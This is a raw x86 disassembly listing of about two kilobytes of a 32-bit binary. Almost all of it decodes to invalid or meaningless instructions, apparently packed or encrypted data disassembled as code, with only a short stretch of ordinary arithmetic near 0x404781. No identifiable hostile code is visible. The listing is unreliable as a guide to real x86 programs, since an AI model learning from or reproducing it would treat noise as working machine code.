  404293:	xor    DWORD PTR [ecx-0x68],ecx
  404296:	jne    0x404248
  404298:	inc    edi
  404299:	adc    ecx,DWORD PTR [edx]
  40429b:	(bad)  [ebx-0x7e]
  40429e:	loopne 0x40426a
  4042a0:	mov    edx,ss
  4042a2:	in     al,0x51
  4042a4:	bound  ecx,QWORD PTR [ebx-0x52c470e0]
  4042aa:	push   esp
  4042ab:	xor    DWORD PTR [ebx-0x4e209a4c],ecx
  4042b1:	or     eax,0xce3850d4
  4042b6:	xor    DWORD PTR [edi+0x7c],ebp
  4042b9:	pop    esi
  4042ba:	sub    edx,edi
  4042bc:	and    esi,DWORD PTR [edi-0x2d]
  4042bf:	(bad)  
  4042c0:	(bad)  
  4042c1:	dec    edx
  4042c2:	mov    ah,0x72
  4042c4:	jecxz  0x40432c
  4042c6:	test   DWORD PTR [ebp+0x16c3ec1a],eax
  4042cc:	fsubr  st(5),st
  4042ce:	cmc    
  4042cf:	or     DWORD PTR [eax-0x6f],eax
  4042d2:	mov    dh,0x69
  4042d4:	inc    esi
  4042d5:	mov    bh,0xee
  4042d7:	lods   eax,DWORD PTR ds:[esi]
  4042d8:	gs in  eax,dx
  4042da:	ins    BYTE PTR es:[edi],dx
  4042db:	outs   dx,BYTE PTR ds:[esi]
  4042dc:	inc    ebp
  4042dd:	call   0x97a04037
  4042e2:	stc    
  4042e3:	leave  
  4042e4:	sbb    eax,0x30e38f89
  4042e9:	pop    edi
  4042ea:	stos   DWORD PTR es:[edi],eax
  4042eb:	arpl   WORD PTR [ebx],di
  4042ed:	add    DWORD PTR [ebp-0x44],0x56
  4042f1:	or     eax,0xe47daff7
  4042f6:	sbb    DWORD PTR [edi-0x62],edi
  4042f9:	or     bl,BYTE PTR [eax+0x57e4028a]
  4042ff:	adc    cl,dh
  404301:	in     al,dx
  404302:	(bad)  
  404303:	test   al,0x53
  404305:	mov    gs,edi
  404307:	xchg   ebp,eax
  404308:	sub    al,0x49
  40430a:	ins    DWORD PTR es:[edi],dx
  40430b:	inc    esi
  40430c:	push   esi
  40430d:	xchg   DWORD PTR [eax-0x4b723546],edi
  404313:	jb     0x4042ee
  404315:	pop    ss
  404316:	shr    DWORD PTR [edi-0x11],0xfe
  40431a:	scas   al,BYTE PTR es:[edi]
  40431b:	bound  esp,QWORD PTR ds:0xfcfbc89d
  404321:	rcr    DWORD PTR [edi+0x735aa9cf],cl
  404327:	cs pop ss
  404329:	mov    edi,0x7a71e60c
  40432e:	repz data16 sbb al,0x8
  404332:	add    bh,cl
  404334:	(bad)  
  404335:	mov    ebp,0xe0b5eb51
  40433a:	in     eax,0xca
  40433c:	call   0xd4b3ebf1
  404341:	push   0xffffffa0
  404343:	mov    ah,0xd2
  404345:	outs   dx,BYTE PTR ds:[esi]
  404346:	retf   0xe35
  404349:	loop   0x404307
  40434b:	lods   al,BYTE PTR ds:[esi]
  40434c:	cmp    eax,0x16b068d5
  404351:	div    BYTE PTR [esi-0x7af4cbf]
  404357:	(bad)  
  404358:	jb     0x404377
  40435a:	shl    BYTE PTR [eax-0x6e],cl
  40435d:	in     al,dx
  40435e:	xchg   ebx,eax
  40435f:	int    0x7d
  404361:	mov    esp,0xe005b333
  404366:	out    dx,al
  404367:	xchg   ecx,eax
  404368:	xor    bh,bl
  40436a:	stc    
  40436b:	adc    DWORD PTR [ebp+0x13],0xe57e5191
  404372:	or     eax,0x4acd8d24
  404377:	aas    
  404378:	mov    eax,0xdfe6b097
  40437d:	sbb    eax,0x73d5fde
  404382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404383:	inc    ebp
  404384:	(bad)  
  404385:	aam    0x19
  404387:	out    0x31,al
  404389:	sub    bh,bl
  40438b:	das    
  40438c:	mov    bl,0x17
  40438e:	fild   DWORD PTR [eax-0x4668f827]
  404394:	ret    
  404395:	sbb    eax,0x97068cd1
  40439a:	jmp    0x4043d8
  40439c:	ret    
  40439d:	pop    ebp
  40439e:	or     DWORD PTR [edi],0x3532244
  4043a4:	jecxz  0x40440d
  4043a6:	xchg   DWORD PTR [esi-0x3e],ebp
  4043a9:	sbb    esi,DWORD PTR [eax-0x37]
  4043ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ad:	mov    al,0x6c
  4043af:	dec    edx
  4043b0:	mov    ch,0xfa
  4043b2:	aad    0x2d
  4043b4:	mul    BYTE PTR [esi-0x6f]
  4043b7:	clc    
  4043b8:	xchg   ebp,eax
  4043b9:	retf   0x645d
  4043bc:	jb     0x40434a
  4043be:	push   edx
  4043bf:	add    dl,BYTE PTR [eax+0x8]
  4043c2:	mov    bl,0xe9
  4043c4:	and    esi,DWORD PTR [eax]
  4043c6:	in     eax,0xce
  4043c8:	and    BYTE PTR [ebx-0x7c17f58a],bh
  4043ce:	(bad)  
  4043cf:	sahf   
  4043d0:	mov    edx,0x42d8dad4
  4043d5:	stc    
  4043d6:	mov    dl,0x22
  4043d8:	mov    ecx,0x8d8f63d
  4043dd:	js     0x404384
  4043df:	les    ebx,FWORD PTR [eax]
  4043e1:	push   esp
  4043e2:	out    dx,al
  4043e3:	adc    al,0x3a
  4043e5:	pop    edi
  4043e6:	sar    BYTE PTR [ebp+0x53],cl
  4043e9:	and    BYTE PTR [ebx+0x76],ah
  4043ec:	jmp    0x404403
  4043ee:	loopne 0x4043c7
  4043f0:	add    ecx,DWORD PTR [ebx+eiz*2+0x2785b77e]
  4043f7:	mov    edx,0xf4326ece
  4043fc:	jl     0x4043af
  4043fe:	cmc    
  4043ff:	shl    DWORD PTR [ecx],1
  404401:	sbb    al,0xfb
  404403:	inc    edx
  404404:	mov    ebx,0x5e4f06f1
  404409:	loop   0x4043da
  40440b:	popa   
  40440c:	cmp    DWORD PTR [ecx],eax
  40440e:	mov    ebp,0x47bff013
  404413:	aas    
  404414:	ffreep st(0)
  404416:	inc    edx
  404417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404418:	leave  
  404419:	push   edi
  40441a:	mov    dh,0xa3
  40441c:	aaa    
  40441d:	jl     0x404414
  40441f:	add    dh,al
  404421:	add    eax,0x787f6f0d
  404426:	mov    cl,dh
  404428:	inc    esp
  404429:	sbb    DWORD PTR gs:[ebp-0xd],ebp
  40442d:	pop    ebp
  40442e:	ss pop ds
  404430:	push   0xffffffad
  404432:	mov    ds:0x402eb6cd,eax
  404437:	push   eax
  404438:	and    cl,al
  40443a:	enter  0xf9cf,0x8
  40443e:	out    dx,al
  40443f:	push   edi
  404440:	mov    eax,ds:0xd4b12773
  404445:	repnz xor al,0xd2
  404448:	fcom   QWORD PTR [ebx]
  40444a:	cmp    dl,BYTE PTR [edx]
  40444c:	cmp    dh,BYTE PTR [edi-0x21747f82]
  404452:	fwait
  404453:	sar    BYTE PTR [eax+0x7711d091],0x16
  40445a:	cmp    eax,0xa0cbe62b
  40445f:	push   0x9466d9c8
  404464:	sbb    ah,cl
  404466:	sbb    eax,0x924cfcba
  40446b:	xchg   DWORD PTR gs:[ebx+esi*1+0x40],esi
  404470:	pop    ecx
  404471:	imul   ebp,DWORD PTR [ecx+ebp*4-0x271dd537],0xffffffdb
  404479:	jl     0x4044bc
  40447b:	cmp    eax,0xfee9f833
  404480:	add    al,BYTE PTR [eax]
  404482:	add    BYTE PTR [edx],al
  404484:	pop    ebp
  404485:	inc    esp
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404433
  404490:	hlt    
  404491:	(bad)  
  404492:	mov    esp,0x7e7e185e
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404508
  40449c:	das    
  40449d:	(bad)  
  40449f:	(bad)
  4044a2:	adc    edi,edi
  4044a4:	mov    al,0x66
  4044a6:	add    DWORD PTR [esi-0x3afc20bc],ebp
  4044ac:	test   BYTE PTR [ebx+ebx*2],0x8b
  4044b0:	es mov esp,0xcbba8ffe
  4044b6:	inc    edi
  4044b7:	xchg   ebp,eax
  4044b8:	cmp    dh,BYTE PTR [edx+ebp*1+0x31]
  4044bc:	not    BYTE PTR [edi]
  4044be:	out    dx,eax
  4044bf:	adc    al,0xf0
  4044c1:	and    DWORD PTR [esi+0x777f96f0],esi
  4044c7:	sub    DWORD PTR [ecx-0x507f0e4d],0x7dddad4d
  4044d1:	lock and BYTE PTR [eax],dh
  4044d4:	or     dh,al
  4044d6:	xor    al,0xf2
  4044d8:	add    eax,0x98c96cd7
  4044dd:	scas   al,BYTE PTR es:[edi]
  4044de:	pop    es
  4044df:	test   al,0xf3
  4044e1:	mov    dl,0xac
  4044e3:	sbb    cl,BYTE PTR [eax-0x70f7f241]
  4044e9:	cdq    
  4044ea:	push   eax
  4044eb:	repnz fwait
  4044ed:	jmp    0xc65c:0xbc3a8325
  4044f4:	ss mov ebp,0xcdcd4399
  4044fa:	cmp    BYTE PTR [ecx+0x30],dl
  4044fd:	sbb    al,0x71
  4044ff:	dec    ebp
  404500:	les    edx,FWORD PTR [eax-0x71]
  404503:	cli    
  404504:	mul    DWORD PTR [esi+0x79c46ac3]
  40450a:	inc    ebp
  40450b:	pop    ebp
  40450c:	iret   
  40450d:	pushfw 
  40450f:	xchg   ebx,eax
  404510:	xchg   edi,eax
  404511:	ja     0x404548
  404513:	jle    0x404578
  404515:	das    
  404516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404517:	add    edi,eax
  404519:	out    0xa3,eax
  40451b:	push   ebx
  40451c:	jae    0x40456a
  40451e:	into   
  40451f:	mov    edi,0x727be635
  404524:	sbb    dl,ch
  404526:	dec    ecx
  404527:	xor    al,0x33
  404529:	not    DWORD PTR [ebx]
  40452b:	dec    edi
  40452c:	aaa    
  40452d:	out    dx,eax
  40452e:	inc    edx
  40452f:	dec    ebp
  404530:	xchg   ebp,eax
  404531:	ret    
  404532:	sahf   
  404533:	lahf   
  404534:	push   edx
  404535:	sbb    BYTE PTR [eax],ah
  404537:	mov    dh,0xa4
  404539:	inc    eax
  40453a:	into   
  40453b:	shr    BYTE PTR [ebp-0x4092926e],cl
  404541:	dec    ebx
  404542:	add    eax,0x4bee7cb2
  404547:	loop   0x4045a2
  404549:	das    
  40454a:	mov    ebx,0x73faaf28
  40454f:	mov    edi,0x5e4cddb0
  404554:	scas   eax,DWORD PTR es:[edi]
  404555:	mov    al,ds:0xe26fc856
  40455a:	jle    0x404577
  40455c:	or     al,0x8
  40455e:	mov    edx,0xe845e467
  404563:	mov    dl,0xbb
  404565:	pushf  
  404566:	sbb    eax,0x47f895e6
  40456b:	int3   
  40456c:	clc    
  40456d:	xor    ebx,DWORD PTR [ecx+ebp*4]
  404570:	dec    edi
  404571:	add    DWORD PTR [edi+0x14],ebp
  404574:	test   BYTE PTR [edx-0x3],bl
  404577:	push   ecx
  404578:	lods   al,BYTE PTR ds:[esi]
  404579:	push   ebx
  40457a:	dec    edi
  40457b:	cs test eax,0xffaf5c7d
  404581:	stos   BYTE PTR es:[edi],al
  404582:	or     edx,DWORD PTR [edi+edi*4]
  404585:	xor    eax,0x826bcda5
  40458a:	jae    0x4045fc
  40458c:	pop    es
  40458d:	ror    DWORD PTR [edx+ecx*2+0x6f81ddb6],0xf4
  404595:	xor    BYTE PTR [edx-0x1],bh
  404598:	add    eax,0xc4cefe51
  40459d:	(bad)  
  4045a0:	or     cl,BYTE PTR [esi]
  4045a2:	addr16 in al,0x9b
  4045a5:	stos   BYTE PTR es:[edi],al
  4045a6:	ret    
  4045a7:	cli    
  4045a8:	sub    DWORD PTR [edx-0x14],ebx
  4045ab:	mov    esi,DWORD PTR [ecx+0x27cb7332]
  4045b1:	dec    ecx
  4045b2:	test   DWORD PTR [esi],esi
  4045b4:	aaa    
  4045b5:	mov    ecx,DWORD PTR [edi-0x36]
  4045b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b9:	mov    cl,bl
  4045bb:	and    BYTE PTR [ebx-0x49],al
  4045be:	fcom   QWORD PTR [ebx-0x3428ac2e]
  4045c4:	adc    dh,BYTE PTR [esi]
  4045c6:	pop    es
  4045c7:	lock pop eax
  4045c9:	fcmovb st,st(4)
  4045cb:	pop    esi
  4045cc:	fmul   DWORD PTR [edx]
  4045ce:	aaa    
  4045cf:	push   ds
  4045d0:	mov    ebp,0xba2a08a1
  4045d5:	add    BYTE PTR [esi-0x1f59d2ae],dl
  4045db:	aam    0x92
  4045dd:	inc    esp
  4045de:	outs   dx,BYTE PTR ds:[esi]
  4045df:	ret    
  4045e0:	dec    esi
  4045e1:	movnti DWORD PTR [edx-0x7b],esp
  4045e5:	mov    dh,0x9c
  4045e7:	pop    esp
  4045e8:	inc    ebp
  4045e9:	or     ebx,0xffffffad
  4045ec:	je     0x4045e7
  4045ee:	xchg   esp,eax
  4045ef:	mov    eax,0x2500fa35
  4045f4:	dec    edi
  4045f5:	jge    0x404628
  4045f7:	adc    eax,DWORD PTR [ebp-0x17]
  4045fa:	mov    ebp,0xa14d3183
  4045ff:	add    eax,0xbe6c1be5
  404604:	xchg   esi,eax
  404605:	sbb    eax,0xe9f9e35f
  40460a:	xor    edi,DWORD PTR [edi+0x27]
  40460d:	push   0x79408da1
  404612:	mov    dl,BYTE PTR [edi+0x35]
  404615:	cmp    DWORD PTR [edi+0x5f],edi
  404618:	ins    BYTE PTR es:[edi],dx
  404619:	ss fmul st,st(5)
  40461c:	mov    eax,0x6a2b8822
  404621:	gs jle 0x40469a
  404624:	inc    ebx
  404625:	dec    edi
  404626:	push   edi
  404627:	mov    edx,edx
  404629:	icebp  
  40462a:	stos   DWORD PTR es:[edi],eax
  40462b:	adc    dh,al
  40462d:	jp     0x4045fe
  40462f:	rcl    BYTE PTR [eax-0x7e],1
  404632:	add    DWORD PTR [edx+eiz*8],ebx
  404635:	push   esp
  404636:	jmp    0x723593bd
  40463b:	fist   DWORD PTR [ebp-0x2a]
  40463e:	sub    al,ch
  404640:	inc    eax
  404641:	jnp    0x4045ca
  404643:	addr16 leave 
  404645:	ins    BYTE PTR es:[edi],dx
  404646:	popf   
  404647:	out    0x51,eax
  404649:	jmp    0x1f2b290c
  40464e:	mov    eax,0x9529524f
  404653:	scas   al,BYTE PTR es:[edi]
  404654:	jg     0x4045e9
  404656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404657:	dec    ecx
  404658:	fisub  DWORD PTR [ebx+0x27]
  40465b:	add    eax,0x9a47b6b8
  404660:	in     eax,0x6b
  404662:	pop    es
  404663:	add    edi,DWORD PTR ds:0xc4019e72
  404669:	or     DWORD PTR [edx+edi*1],esp
  40466c:	inc    eax
  40466d:	cmp    al,0x86
  40466f:	cmp    BYTE PTR [ecx+0x5],0xd0
  404673:	(bad)  
  404674:	fisttp WORD PTR [esi+0x67]
  404677:	mov    bh,0xff
  404679:	sub    esi,ecx
  40467b:	ficomp DWORD PTR [ebx-0x56]
  40467e:	fsub   st,st(4)
  404680:	sbb    bh,dh
  404682:	dec    esi
  404683:	adc    ecx,DWORD PTR [ecx-0x7543df86]
  404689:	stos   BYTE PTR es:[edi],al
  40468a:	scas   eax,DWORD PTR es:[edi]
  40468b:	add    eax,0x9cf08c1f
  404690:	mov    ds:0x1ff3b46d,al
  404695:	fsub   QWORD PTR [ecx-0x4ab1bbac]
  40469c:	stos   DWORD PTR es:[edi],eax
  40469d:	mov    bh,0x66
  40469f:	cld    
  4046a0:	cmp    esp,0xde248df9
  4046a6:	test   DWORD PTR ds:0x7b87b265,ebp
  4046ac:	les    edx,FWORD PTR [esi]
  4046ae:	test   edx,edx
  4046b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b1:	(bad)
  4046b4:	call   0x8009cc7e
  4046b9:	enter  0xd7d4,0xdf
  4046bd:	pop    ds
  4046be:	dec    ebx
  4046bf:	sub    al,BYTE PTR [edx-0xe]
  4046c2:	scas   eax,DWORD PTR es:[edi]
  4046c3:	sub    DWORD PTR [ecx],edx
  4046c5:	test   eax,0xb97c45df
  4046ca:	mov    esp,0xfa042080
  4046cf:	cld    
  4046d0:	push   esi
  4046d1:	mov    edi,0xb0e7c4ca
  4046d6:	cmc    
  4046d7:	sbb    DWORD PTR [eax],edi
  4046d9:	lea    edi,[edx+0x48]
  4046dc:	inc    ebx
  4046dd:	push   0xa
  4046df:	or     cl,BYTE PTR ds:0xadc1040f
  4046e5:	mov    esi,0x816fd82d
  4046ea:	xor    dh,bl
  4046ec:	push   cs
  4046ed:	pop    ebx
  4046ee:	fiadd  WORD PTR ds:0xc7fac40a
  4046f4:	int3   
  4046f5:	les    ebx,FWORD PTR [eax+0x37]
  4046f8:	mov    ebx,0x8b867563
  4046fd:	aaa    
  4046fe:	lahf   
  4046ff:	adc    BYTE PTR [eax+0x7e],bh
  404702:	xor    BYTE PTR [edi+0x65d4ac4b],dh
  404708:	mov    ah,0xef
  40470a:	fcom   DWORD PTR [eax+0x65cb5c77]
  404710:	std    
  404711:	iret   
  404712:	ret    
  404713:	lds    esi,FWORD PTR [ecx-0x5f99d6f9]
  404719:	push   es
  40471a:	jg     0x4046fb
  40471c:	xchg   BYTE PTR [esi+0x3ba42b13],al
  404722:	mov    ds:0x5caf26f0,al
  404727:	pusha  
  404728:	loopne 0x4046fe
  40472a:	or     al,0x89
  40472c:	mov    ebx,0xe54e0141
  404731:	pop    es
  404732:	es scas al,BYTE PTR es:[edi]
  404734:	xor    ch,BYTE PTR [ebx-0x7788313d]
  40473a:	lock dec edi
  40473c:	clc    
  40473d:	cdq    
  40473e:	fcmovne st,st(0)
  404740:	js     0x40470e
  404742:	xchg   ebx,eax
  404743:	sub    ebp,DWORD PTR [edx-0x51]
  404746:	test   DWORD PTR [edx-0x377adc79],esi
  40474c:	iret   
  40474d:	cmp    DWORD PTR [eax-0x39],0xffffff80
  404751:	jnp    0x4046d3
  404753:	push   ss
  404754:	jmp    0x404772
  404756:	pop    ebx
  404757:	mov    eax,ds:0xd1e59682
  40475c:	cdq    
  40475d:	out    dx,al
  40475e:	daa    
  40475f:	jmp    0x91b26ee1
  404764:	push   0xba4dfe48
  404769:	scas   al,BYTE PTR es:[edi]
  40476a:	inc    ebp
  40476b:	icebp  
  40476c:	jmp    0x35253c9e
  404771:	call   0xd86f2e09
  404776:	jnp    0x404772
  404778:	ins    DWORD PTR es:[edi],dx
  404779:	(bad)  
  40477a:	leave  
  40477b:	add    esi,DWORD PTR [ecx]
  40477d:	pop    eax
  40477e:	dec    ecx
  40477f:	push   edi
  404780:	ret    
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	pop    esp
  4047b5:	jno    0x4047af
  4047b7:	dec    esi
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404792
  4047c1:	cdq    
  4047c2:	rol    ch,1
  4047c4:	dec    esp
  4047c5:	cs jo  0x40480c
  4047c8:	xor    eax,0xee2598ff
  4047cd:	pop    esi
  4047ce:	jne    0x4047c4
  4047d0:	inc    esi
  4047d1:	mov    ebp,ds
  4047d3:	add    cl,BYTE PTR [edi+ebp*4+0x4f]
  4047d7:	or     DWORD PTR [edx-0x14],ecx
  4047da:	inc    esp
  4047db:	or     bh,ch
  4047dd:	inc    edi
  4047de:	dec    esi
  4047df:	xchg   esp,eax
  4047e0:	push   cs
  4047e1:	cmp    DWORD PTR [edi+eiz*1],esp
  4047e4:	push   ebx
  4047e5:	mov    bl,0x9b
  4047e7:	push   0xffffffe4
  4047e9:	hlt    
  4047ea:	push   edi
  4047eb:	push   0xffffff8f
  4047ed:	or     eax,0xac163087
  4047f2:	lea    esp,[ebp-0x5c]
  4047f5:	rcr    DWORD PTR [ebp+0x9],0xdf
  4047f9:	xor    al,0x83
  4047fb:	mov    eax,ds:0x53378dc2
  404800:	jb     0x404796
  404802:	dec    ebx
  404803:	into   
  404804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404805:	push   ds
  404806:	xchg   edx,eax
  404807:	push   ecx
  404808:	pushf  
  404809:	out    dx,al
  40480a:	and    edi,DWORD PTR [edx+0x5d68a18a]
  404810:	adc    eax,ebx
  404812:	sub    ch,BYTE PTR [edi]
  404814:	or     ebx,DWORD PTR [edx]
  404816:	mov    dl,0xd2
  404818:	sbb    DWORD PTR [ebx-0x7f38b786],edi
  40481e:	popf   
  40481f:	fild   WORD PTR [esi+0x73]
  404822:	cmp    al,BYTE PTR [edi+ebx*4-0x3d7c9647]
  404829:	mov    esi,0x1cac21c8
  40482e:	cdq    
  40482f:	jno    0x40485a
  404831:	sti    
  404832:	cmp    al,0xd8
  404834:	add    eax,0xe52ad032
  404839:	sahf   
  40483a:	gs aad 0xc7
  40483d:	cmp    cl,BYTE PTR [edx-0x12a044df]
  404843:	xchg   edi,eax
  404844:	scas   eax,DWORD PTR es:[edi]
  404845:	push   0xffffffde
  404847:	js     0x404881
  404849:	cmp    bl,BYTE PTR [ebx]
  40484b:	jge    0x4048c4
  40484d:	cmp    ch,cl
  40484f:	sub    DWORD PTR [ebp-0x63],esp
  404852:	fcmovb st,st(2)
  404854:	mov    bl,0xe6
  404856:	iret   
  404857:	mov    bh,0x54
  404859:	xchg   esi,eax
  40485a:	xchg   edx,eax
  40485b:	xchg   BYTE PTR [ecx],dh
  40485d:	adc    eax,0x3a5ff44c
  404862:	jmp    0x404899
  404864:	into   
  404865:	mov    esp,0x6c236501
  40486a:	pushf  
  40486b:	or     ebx,ecx
  40486d:	test   al,0x84
  40486f:	sub    eax,0xe54ccf59
  404874:	lahf   
  404875:	fisttp QWORD PTR [ecx+0x15]
  404878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404879:	mov    ds:0xe3aca209,al
  40487e:	fdiv   DWORD PTR [ebx+0x704cf47d]
  404884:	sub    al,0x69
  404886:	(bad)  
  404887:	jge    0x404885
  404889:	xchg   esi,eax
  40488a:	mov    eax,DWORD PTR [ebx-0x2e0744e5]
  404890:	push   0x3f
  404892:	jnp    0x4048f7
  404894:	sbb    BYTE PTR [ecx-0x15de399b],bh
  40489a:	dec    edi
  40489b:	fild   WORD PTR [edx-0x5739fd4a]
  4048a1:	mov    ecx,DWORD PTR [esi+0x7e]
  4048a4:	ins    DWORD PTR es:[edi],dx
  4048a5:	das    
  4048a6:	jecxz  0x40491d
  4048a8:	and    esp,DWORD PTR [esi+0x406e80b9]
  4048ae:	addr16 iret 
  4048b0:	aam    0xc1
  4048b2:	int3   
  4048b3:	pop    eax
  4048b4:	mov    al,0x36
  4048b6:	sub    DWORD PTR [ebp-0x22901793],ebp
  4048bc:	imul   ebp,DWORD PTR [edx],0x16e67a01
  4048c2:	adc    cl,ch
  4048c4:	mov    cl,0x63
  4048c6:	mov    ds:0xc5bab66c,al
  4048cb:	push   esp
  4048cc:	jge    0x404854
  4048ce:	mov    edx,0x644f676a
  4048d3:	mov    eax,ds:0x1b24756b
  4048d8:	ja     0x4048df
  4048da:	inc    ebx
  4048db:	test   eax,0x66342fd3
  4048e0:	push   0x5e
  4048e2:	pop    ecx
  4048e3:	cdq    
  4048e4:	aad    0x44
  4048e6:	arpl   WORD PTR [ebx],bp
  4048e8:	inc    edx
  4048e9:	jg     0x404968
  4048eb:	cmp    ebp,esp
  4048ed:	pop    ebp
  4048ee:	scas   eax,DWORD PTR es:[edi]
  4048ef:	sti    
  4048f0:	mov    edx,0xdcb6f4ee
  4048f5:	add    DWORD PTR [ecx+ebx*4+0x71],ecx
  4048f9:	inc    edx
  4048fa:	sub    edx,ecx
  4048fc:	mov    BYTE PTR [esi+esi*8],ch
  4048ff:	jns    0x40496d
  404901:	(bad)  
  404902:	repz mov eax,ds:0xbe89e9c0
  404908:	sti    
  404909:	cs (bad) 
  40490b:	loopne 0x4048da
  40490d:	mov    edx,0x621dd64a
  404912:	inc    edi
  404913:	dec    ecx
  404914:	cmp    DWORD PTR [edx],0x48
  404917:	out    dx,eax
  404918:	repz pop esi
  40491a:	jle    0x4048b4
  40491c:	std    
  40491d:	xlat   BYTE PTR ds:[ebx]
  40491e:	outs   dx,DWORD PTR ds:[esi]
  40491f:	add    al,0xa2
  404921:	xchg   ebx,eax
  404922:	out    dx,al
  404923:	mov    esp,0xbf849fdc
  404928:	push   ebx
  404929:	pop    esi
  40492a:	mov    ah,0x6b
  40492c:	sub    eax,0x8acc7307
  404931:	loop   0x4048fd
  404933:	mov    BYTE PTR [edx],al
  404935:	ret    0xd8b9
  404938:	add    BYTE PTR ds:0xb7b04be2,dl
  40493e:	sbb    al,0x85
  404940:	lds    ecx,FWORD PTR [eax+edi*2-0x249f4ee0]
  404947:	or     DWORD PTR [eax-0x76],edi
  40494a:	inc    esi
  40494b:	stos   DWORD PTR es:[edi],eax
  40494c:	(bad)  
  40494e:	mov    eax,0x38a7a6be
  404953:	ret    0xb26d
  404956:	test   edx,edx
  404958:	or     al,0x25
  40495a:	loopne 0x40497e
  40495c:	mov    eax,0x85f0eec8
  404961:	cld    
  404962:	xchg   edx,eax
  404963:	add    al,BYTE PTR [ecx-0x3a]
  404966:	mov    ds:0x3d632a2,eax
  40496b:	xchg   ebx,eax
  40496c:	sbb    eax,0xed02b8fc
  404971:	pop    ebx
  404972:	jmp    0x84847530
  404977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404978:	lods   al,BYTE PTR ds:[esi]
  404979:	dec    edi
  40497a:	mov    cl,0x32
  40497c:	dec    esi
  40497d:	or     eax,0x860cb745
  404982:	test   al,0x86
  404984:	fidiv  DWORD PTR ds:0x629894c0
  40498a:	jb     0x404971
  40498c:	push   edi
  40498d:	adc    bl,BYTE PTR [edx-0x27]
  404990:	xchg   ebp,eax
  404991:	or     bh,dl
  404993:	xor    edx,ecx
  404995:	sbb    BYTE PTR [edx],0xb3
  404998:	repnz xor dl,ah
  40499b:	int3   
  40499c:	and    ah,BYTE PTR [edi-0x28]
  40499f:	stc    
  4049a0:	inc    ebx
  4049a1:	int    0xcd
  4049a3:	adc    esi,esi
  4049a5:	inc    esi
  4049a6:	inc    ebx
  4049a7:	(bad)  
  4049a8:	or     eax,DWORD PTR ds:0xd9540e73
  4049ae:	inc    edx
  4049af:	add    esi,ebx
  4049b1:	imul   edi,DWORD PTR [ecx],0xab30181
  4049b7:	repnz lds esp,FWORD PTR [ebx]
  4049ba:	pop    ds
  4049bb:	xor    esp,DWORD PTR [ecx-0x20]
  4049be:	outs   dx,DWORD PTR ds:[esi]
  4049bf:	sub    BYTE PTR [eax+0x1b689c0a],dl
  4049c5:	test   eax,0xcd1421e3
  4049ca:	scas   al,BYTE PTR es:[edi]
  4049cb:	cdq    
  4049cc:	mov    al,0xc8
  4049ce:	leave  
  4049cf:	imul   eax,DWORD PTR [ebp+0x6da5416b],0xaca2d82a
  4049d9:	mov    eax,ds:0xd2344fc1
  4049de:	je     0x404a04
  4049e0:	add    eax,0x6ea0529c
  4049e5:	xor    al,0x54
  4049e7:	popa   
  4049e8:	lahf   
  4049e9:	mov    bh,0x32
  4049eb:	xor    al,0x36
  4049ed:	js     0x40497d
  4049ef:	nop
  4049f0:	and    edx,0x1f8a737
  4049f6:	mov    esi,0xad35a3ff
  4049fc:	dec    edi
  4049fd:	ss pushf 
  4049ff:	cmc    
  404a00:	out    0x6c,eax
  404a02:	aas    
  404a03:	aad    0xfe
  404a05:	ror    DWORD PTR [edx-0x7c],1
  404a08:	scas   al,BYTE PTR es:[edi]
  404a09:	retf   
  404a0a:	shl    BYTE PTR [edx-0x34ca8742],cl
  404a10:	std    
  404a11:	mov    al,ds:0xe371f513
  404a16:	and    eax,0xd9b0dc01
  404a1b:	inc    eax
  404a1c:	(bad)  
  404a1d:	push   cs
  404a1e:	and    al,0x9d
  404a20:	ja     0x404a55
  404a22:	or     al,cl
  404a24:	sub    dh,BYTE PTR [ebx+0x4e]
  404a27:	push   edi
  404a28:	ss add eax,0x9ff7e235
  404a2e:	scas   eax,DWORD PTR es:[edi]
  404a2f:	lods   eax,DWORD PTR ds:[esi]
  404a30:	xchg   ecx,eax
  404a31:	cmc    
  404a32:	and    ah,BYTE PTR [esp+ecx*8-0x79]
  404a36:	mov    bh,0xa4
  404a38:	adc    DWORD PTR [ebx+eiz*8+0x27a732],edx
  404a3f:	jle    0x404a90
  404a41:	dec    ebp
  404a42:	add    BYTE PTR [esi+0x492fe6cc],bh
  404a48:	ret    0xf0c6
  404a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a4c:	mov    esi,0x55fc44de
  404a51:	fdiv   DWORD PTR [edi]
  404a53:	add    bh,BYTE PTR [ebx-0x50]
  404a56:	fist   DWORD PTR [ebx+0x3e43a4d7]
  404a5c:	xor    dl,BYTE PTR [esp+edx*4]
  404a5f:	xor    eax,0x9c71b3f6
  404a64:	fidivr WORD PTR [edi-0x5766ac9a]
  404a6a:	dec    edx
  404a6b:	fnstsw WORD PTR [edx-0x606aa088]
  404a71:	hlt    
  404a72:	test   esi,ecx
  404a74:	inc    esp
  404a75:	(bad)  
  404a76:	or     DWORD PTR [edi],ebx
  404a78:	(bad)  
  404a79:	in     eax,dx
  404a7a:	ja     0x404ab3
